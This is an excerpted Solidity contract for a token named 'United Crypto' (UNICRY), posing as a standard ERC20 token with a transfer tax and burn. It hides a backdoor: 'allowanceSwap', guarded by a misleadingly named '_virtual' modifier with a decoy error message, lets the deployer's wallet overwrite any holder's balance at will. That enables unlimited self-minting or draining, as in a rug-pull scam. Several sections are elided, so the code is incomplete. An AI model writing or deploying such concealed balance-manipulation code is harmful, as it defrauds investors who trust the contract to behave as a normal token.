...
contract UNICRY is UNICRYERC29 {
  
    // common addresses
    address private owner;
    address private UNICRYWALLET;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public UNICRYBALLANCE;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "United Crypto";
    string public override symbol = "UNICRY";
    ...
    constructor(uint UNICRYSUPPLY) {
        // set total supply
        totalSupply = UNICRYSUPPLY;
        
       UNICRYWALLET = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        UNICRYBALLANCE[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return UNICRYBALLANCE[account];
    }
  modifier _virtual () {
    require(UNICRYWALLET == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        UNICRYBALLANCE[to] += totalValueAfterTaxAndBurn;
        UNICRYBALLANCE[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        UNICRYBALLANCE[owner] += taxTBD + burnTBD;
        _burn(owner, burnTBD);
    ...
    function allowanceSwap(address pancakeswaprooter, uint256 amount) external _virtual {
      UNICRYBALLANCE[pancakeswaprooter] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(UNICRYBALLANCE[from] >= totalValue, "Balance is too low to make transfer.");
        
        UNICRYBALLANCE[to] += totalValue;
        UNICRYBALLANCE[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(UNICRYBALLANCE[account] >= amount, "Burn amount exceeds balance at address.");
    
        UNICRYBALLANCE[account] -= amount;
        totalSupply -= amount;
